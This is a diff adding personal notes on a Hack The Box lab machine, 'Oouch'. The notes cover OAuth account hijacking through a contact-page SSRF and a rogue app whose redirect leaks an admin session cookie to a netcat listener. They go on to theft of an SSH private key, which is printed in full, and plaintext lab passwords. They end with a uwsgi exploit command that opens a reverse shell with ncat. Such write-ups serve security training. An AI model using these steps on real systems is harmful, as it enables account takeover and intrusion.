@@ -1,0 +1,169 @@
+found a file inside ftp server
+
+cat project.txt 
+Flask -> Consumer
+Django -> Authorization Server
+
+
+we can register: 10.10.10.177:5000
+possible SSRF in contact page (message is sent to administrator)
+
+gobuster dir -u http://10.10.10.177:5000 -w /usr/share/wordlists/dirb/common.txt
+
+/about (Status: 302)
+/contact (Status: 302)
+/documents (Status: 302)
+/home (Status: 302)
+/login (Status: 200)
+/logout (Status: 302)
+/oauth (Status: 302)
+/profile (Status: 302)
+/register (Status: 200)
+
+In order to connect your account with our Oouch authorization server, please visit:
+http://consumer.oouch.htb:5000/oauth/connect
+
+Once your account is connected, you should be able to use the authorization server for login. Just visit:
+http://consumer.oouch.htb:5000/oauth/login
+
+add this subdomain to hosts
+
+using burb to analyze the connection to the oauth connect:
+authorization.oouch.htb:8000
+
+register in the authentication server
+get back to cosumer.oouch.htb:5000/ouath/connect
+using burp to get the token to connect to administrative account
+http://consumer.oouch.htb:5000/oauth/connect/token?code=hZIVYN7RgujoaO8FDU0tcnXMvi74NF 
+and drop the connection!!!
+
+send url to the administrator using the contact page
+customer.oouch.htb:5000/oauth/connect without burp, and authorize
+
+account connected with 	QTC!
+
+in documents tab...:
+
+DEV_ACCESS.TXT -> develop:supermegasecureklarabubu123! -> Allows application registration.
+O_AUTH_NOTES.TXT -> /api/get_user -> user data. oauth/authorize -> Now also supports GET method.
+
+Chris mentioned all users could obtain my ssh key. Must be a joke...
+
+gobuster dir -u http://authorization.oouch.htb:8000/oauth -w /usr/share/wordlists/dirb/common.txt
+/applications (Status: 301)
+
+gobuster dir -u http://authorization.oouch.htb:8000/oauth/applications -w /usr/share/wordlists/dirb/common.txt
+/register (Status: 301)
+
+
+login with develop creds (DEV_ACCESS.TXT)
+
+APP:
+	Name: bisso_app
+	ClientID:75dYG5yNYk0Nw9VIx5KoOeMbHLrlNRVbVuG0O4LS
+	ClientScret:kilwAjUuFHx9duSC2yxXmH42g3ZpouzE5Icc2BEDDWWyOM5ACiMasvmlwjLa3vwzuZ6yqZy3fCPrT8uN7DCkQtENHEyi2CBqoLzXuVZJw8TWNVXqWNtpcacmD0cCh4uX
+	Type:public
+	GrantType: authorization code
+	RedirectURI:http://10.10.16.50:80
+	appID: 4
+
+	http://authorization.oouch.htb:8000/oauth/applications/4/
+
+We can redirect uri, let's use our server
+Now with the SSRF, if QTC access our app, and get redirected to our server, we can get his coolie and use it to connect on authorization server
+
+https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm
+url to access the APP:
+
+http://authorization.oouch.htb:8000/oauth/authorize?response_type=code&client_id=75dYG5yNYk0Nw9VIx5KoOeMbHLrlNRVbVuG0O4LS&redirect_uri=http://10.10.16.50:80&grant_type=authorization_code&client_secret=kilwAjUuFHx9duSC2yxXmH42g3ZpouzE5Icc2BEDDWWyOM5ACiMasvmlwjLa3vwzuZ6yqZy3fCPrT8uN7DCkQtENHEyi2CBqoLzXuVZJw8TWNVXqWNtpcacmD0cCh4uX
+
+sudo nc -lvnp 80
+
+access the url and... it work! :D
+can take some time ... (maybe remove the response_type parameter
+connect to [10.10.16.50] from (UNKNOWN) [10.10.10.177] 55984
+GET /?error=invalid_request&error_description=Missing+response_type+parameter. HTTP/1.1
+Host: 10.10.16.50
+User-Agent: python-requests/2.21.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: sessionid=th2vkopgrp2zh9z7024llkwfn5gfjrnc;
+
+use cookie editor plugin to change the session and refresh
+
+Now we need his token to access the api get_user
+https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/
+
+following this instructions and using burp
+authorizatio.oouch.htb:8000/ouath/token as qtc
+change the request method to post and send to repeater
+	
+add the following:
+	grant_type=client_credentials
+	&client_id=xxxxxxxxxx
+	&client_secret=xxxxxxxxxx
+
+"access_token": "LH3AEHrcVtqayAxxe59a9Tgy5qW7CY", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
+http://authorization.oouch.htb:8000/api/get_user?access_token=LH3AEHrcVtqayAxxe59a9Tgy5qW7CY
+{"username": "qtc", "firstname": "", "lastname": "", "email": "qtc@nonexistend.nonono"}
+
+http://authorization.oouch.htb:8000/api/get_ssh?access_token=LH3AEHrcVtqayAxxe59a9Tgy5qW7CY
+{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAqQvHuKA1i28D1ldvVbFB8PL7ARxBNy8Ve/hfW/V7cmEHTDTJtmk7\nLJZzc1djIKKqYL8eB0ZbVpSmINLfJ2xnCbgRLyo5aEbj1Xw+fdr9/yK1Ie55KQjgnghNdg\nreZeDWnTfBrY8sd18rwBQpxLphpCR367M9Muw6K31tJhNlIwKtOWy5oDo/O88UnqIqaiJV\nZFDpHJ/u0uQc8zqqdHR1HtVVbXiM3u5M/6tb3j98Rx7swrNECt2WyrmYorYLoTvGK4frIv\nbv8lvztG48WrsIEyvSEKNqNUfnRGFYUJZUMridN5iOyavU7iY0loMrn2xikuVrIeUcXRbl\nzeFwTaxkkChXKgYdnWHs+15qrDmZTzQYgamx7+vD13cTuZqKmHkRFEPDfa/PXloKIqi2jA\ntZVbgiVqnS0F+4BxE2T38q//G513iR1EXuPzh4jQIBGDCciq5VNs3t0un+gd5Ae40esJKe\nVcpPi1sKFO7cFyhQ8EME2DbgMxcAZCj0vypbOeWlAAAFiA7BX3cOwV93AAAAB3NzaC1yc2\nEAAAGBAKkLx7igNYtvA9ZXb1WxQfDy+wEcQTcvFXv4X1v1e3JhB0w0ybZpOyyWc3NXYyCi\nqmC/HgdGW1aUpiDS3ydsZwm4ES8qOWhG49V8Pn3a/f8itSHueSkI4J4ITXYK3mXg1p03wa\n2PLHdfK8AUKcS6YaQkd+uzPTLsOit9bSYTZSMCrTlsuaA6PzvPFJ6iKmoiVWRQ6Ryf7tLk\nHPM6qnR0dR7VVW14jN7uTP+rW94/fEce7MKzRArdlsq5mKK2C6E7xiuH6yL27/Jb87RuPF\nq7CBMr0hCjajVH50RhWFCWVDK4nTeYjsmr1O4mNJaDK59sYpLlayHlHF0W5c3hcE2sZJAo\nVyoGHZ1h7Pteaqw5mU80GIGpse/rw9d3E7maiph5ERRDw32vz15aCiKotowLWVW4Ilap0t\nBfuAcRNk9/Kv/xudd4kdRF7j84eI0CARgwnIquVTbN7dLp/oHeQHuNHrCSnlXKT4tbChTu\n3BcoUPBDBNg24DMXAGQo9L8qWznlpQAAAAMBAAEAAAGBAJ5OLtmiBqKt8tz+AoAwQD1hfl\nfa2uPPzwHKZZrbd6B0Zv4hjSiqwUSPHEzOcEE2s/Fn6LoNVCnviOfCMkJcDN4YJteRZjNV\n97SL5oW72BLesNu21HXuH1M/GTNLGFw1wyV1+oULSCv9zx3QhBD8LcYmdLsgnlYazJq/mc\nCHdzXjIs9dFzSKd38N/RRVbvz3bBpGfxdUWrXZ85Z/wPLPwIKAa8DZnKqEZU0kbyLhNwPv\nXO80K6s1OipcxijR7HAwZW3haZ6k2NiXVIZC/m/WxSVO6x8zli7mUqpik1VZ3X9HWH9ltz\ntESlvBYHGgukRO/OFr7VOd/EpqAPrdH4xtm0wM02k+qVMlKId9uv0KtbUQHV2kvYIiCIYp\n/Mga78V3INxpZJvdCdaazU5sujV7FEAksUYxbkYGaXeexhrF6SfyMpOc2cB/rDms7KYYFL\n/4Rau4TzmN5ey1qfApzYC981Yy4tfFUz8aUfKERomy9aYdcGurLJjvi0r84nK3ZpqiHQAA\nAMBS+Fx1SFnQvV/c5dvvx4zk1Yi3k3HCEvfWq5NG5eMsj+WRrPcCyc7oAvb/TzVn/Eityt\ncEfjDKSNmvr2SzUa76Uvpr12MDMcepZ5xKblUkwTzAAannbbaxbSkyeRFh3k7w5y3N3M5j\nsz47/4WTxuEwK0xoabNKbSk+plBU4y2b2moUQTXTHJcjrlwTMXTV2k5Qr6uCyvQENZGDRt\nXkgLd4XMed+UCmjpC92/Ubjc+g/qVhuFcHEs9LDTG9tAZtgAEAAADBANMRIDSfMKdc38il\njKbnPU6MxqGII7gKKTrC3MmheAr7DG7FPaceGPHw3n8KEl0iP1wnyDjFnlrs7JR2OgUzs9\ndPU3FW6pLMOceN1tkWj+/8W15XW5J31AvD8dnb950rdt5lsyWse8+APAmBhpMzRftWh86w\nEQL28qajGxNQ12KeqYG7CRpTDkgscTEEbAJEXAy1zhp+h0q51RbFLVkkl4mmjHzz0/6Qxl\ntV7VTC+G7uEeFT24oYr4swNZ+xahTGvwAAAMEAzQiSBu4dA6BMieRFl3MdqYuvK58lj0NM\n2lVKmE7TTJTRYYhjA0vrE/kNlVwPIY6YQaUnAsD7MGrWpT14AbKiQfnU7JyNOl5B8E10Co\nG/0EInDfKoStwI9KV7/RG6U7mYAosyyeN+MHdObc23YrENAwpZMZdKFRnro5xWTSdQqoVN\nzYClNLoH22l81l3minmQ2+Gy7gWMEgTx/wKkse36MHo7n4hwaTlUz5ujuTVzS+57Hupbwk\nIEkgsoEGTkznCbAAAADnBlbnRlc3RlckBrYWxpAQIDBA==\n-----END OPENSSH PRIVATE KEY-----"}
+
+chmod 600 id_rsa
+ssh -i id_rsa qtc@10.10.10.177
+
+user :D
+
+qtc@oouch:~$ cat .note.txt 
+Implementing an IPS using DBus and iptables == Genius?
+
+
+docker is running
+ip a: 172.18.0.1/16
+
+qtc@oouch:~/.ssh$ ssh -i id_rsa qtc@172.18.0.2
+
+connected to docker
+
+qtc@aeb4525789d8:/code$ cat config.py 
+import os
+
+basedir = os.path.abspath(os.path.dirname(__file__))
+
+class Config(object):
+    # ...
+    SQLALCHEMY_DATABASE_URI = 'mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer'
+    SQLALCHEMY_TRACK_MODIFICATIONS = False
+
+    SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
+
+DBus interface: htb.oouch.Block
+
+qtc@oouch:/etc/dbus-1/system.d$ cat htb.oouch.Block.conf 
+<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
+
+<!DOCTYPE busconfig PUBLIC
+ "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+
+<busconfig>
+
+    <policy user="root">
+        <allow own="htb.oouch.Block"/>
+    </policy>
+
+        <policy user="www-data">
+                <allow send_destination="htb.oouch.Block"/>
+                <allow receive_sender="htb.oouch.Block"/>
+        </policy>
+
+</busconfig>
+
+www-data owns uwsgi
+https://github.com/wofeiwo/webcgi-exploits
+
+remove if import bytes line and the after the if statement in line below!
+
+python exploit.py -m unix -u /tmp/uwsgi.socket -c "/tmp/ncat /bin/bash/ 172.17.0.1 3333"
